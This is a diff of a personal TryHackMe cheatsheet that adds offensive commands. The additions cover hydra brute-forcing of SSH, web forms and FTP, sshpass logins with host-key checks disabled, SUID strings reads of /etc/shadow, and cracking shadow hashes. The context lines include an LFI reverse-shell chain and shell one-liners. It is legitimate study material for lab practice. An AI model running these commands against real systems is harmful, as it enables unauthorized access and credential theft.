@@ -10,8 +10,9 @@ Personal cheatsheet of frequently used commands across TryHackMe engagements. Or
 - [Web Enumeration](#-web-enumeration)
 - [SQL Injection](#-sql-injection)
 - [LFI / Path Traversal](#-lfi--path-traversal)
+- [Encoding / Decoding](#-encoding--decoding)
 - [Shells](#-shells)
-- [SSH](#-ssh)
+- [SSH / Brute-force](#-ssh)
 - [SMB, NFS & Network Services](#-smb-nfs--network-services)
 - [Service Exploitation](#-service-exploitation)
 - [Hash Cracking](#-hash-cracking)
@@ -176,6 +177,31 @@ curl "http://<target>/vuln.php?file=${CHAIN}&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ft
 
 ---
 
+## 🔣 Encoding / Decoding
+
+```bash
+# base64 decode / encode
+echo '<string>' | base64 -d
+echo '<string>' | base64
+
+# base32 decode
+echo '<string>' | base32 -d
+
+# Hex to ASCII
+echo '<hex>' | xxd -r -p
+
+# ROT13
+echo '<string>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+# Multi-layer chain (e.g. Base32 → Hex → ROT13 as seen in CTF HTML comments)
+echo '<string>' | base32 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+# URL-encode a payload string (before passing via curl ?cmd= parameter)
+python3 -c "import urllib.parse; print(urllib.parse.quote('<command>'))"
+```
+
+---
+
 ## 🐚 Shells
 
 ### Reverse Shell One-liners
@@ -225,6 +251,9 @@ nc -nlvp <port>
 # Connect with key
 ssh -i <keyfile> <user>@<target>
 
+# Connect on non-standard port
+ssh <user>@<target> -p <port>
+
 # Generate keypair
 ssh-keygen -t ed25519 -f ./id_ed25519
 
@@ -233,6 +262,40 @@ echo '<pubkey>' >> /home/<user>/.ssh/authorized_keys
 
 # Local port forward
 ssh -L <localport>:127.0.0.1:<remoteport> <user>@<target>
+```
+
+### sshpass — Non-interactive SSH / SCP
+
+```bash
+# SSH with password (avoids interactive prompt — useful in scripts)
+sshpass -p '<password>' ssh <user>@<target>
+sshpass -p '<password>' ssh -p <port> -o StrictHostKeyChecking=no <user>@<target>
+
+# SCP file transfer with password
+sshpass -p '<password>' scp -P <port> -o StrictHostKeyChecking=no <localfile> <user>@<target>:/path/
+sshpass -p '<password>' scp -P <port> -o StrictHostKeyChecking=no <user>@<target>:/remote/file ./
+```
+
+### hydra — Brute-force
+
+```bash
+# SSH brute-force with custom wordlist
+hydra -l <user> -P <wordlist> ssh://<target> -t 4 -V
+
+# SSH on non-standard port
+hydra -l <user> -P <wordlist> ssh://<target>:<port> -t 4 -V
+
+# Multiple usernames
+hydra -L <users.txt> -P <wordlist> ssh://<target> -t 4 -V
+
+# HTTP POST form login (failure string = text present on failed login page)
+hydra -l <user> -P <wordlist> <target> http-post-form "/login.php:username=^USER^&password=^PASS^:<failure-string>" -t 4 -V
+
+# HTTP GET form login
+hydra -l <user> -P <wordlist> <target> http-get-form "/login.php:username=^USER^&password=^PASS^:<failure-string>" -t 4 -V
+
+# FTP brute-force
+hydra -l <user> -P <wordlist> ftp://<target> -t 4 -V
 ```
 
 ---
@@ -361,6 +424,9 @@ hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
 # bcrypt
 hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
 
+# sha512crypt ($6$) — Linux /etc/shadow root hashes
+hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
+
 # NTLM
 hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
 
@@ -411,6 +477,7 @@ openssl passwd -6 -salt xyz <password>   # SHA512crypt
 # steghide — extract hidden data
 steghide extract -sf <image.jpg>
 steghide extract -sf <image.jpg> -p <passphrase>
+steghide extract -sf <image.jpg> -p <passphrase> -f   # -f force overwrite existing output file
 
 # steghide — inspect without extracting
 steghide info <image.jpg>
@@ -540,6 +607,11 @@ Useful when a non-standard SUID binary has no manpage — strace reveals the scr
 # SUID Python
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# SUID strings — arbitrary file read (no shell needed)
+# Useful when strings is SUID root and you belong to its allowed group
+strings /etc/shadow
+strings /root/root.txt
 
 # SUID xxd — /etc/passwd overwrite
 cp /etc/passwd /tmp/newpasswd
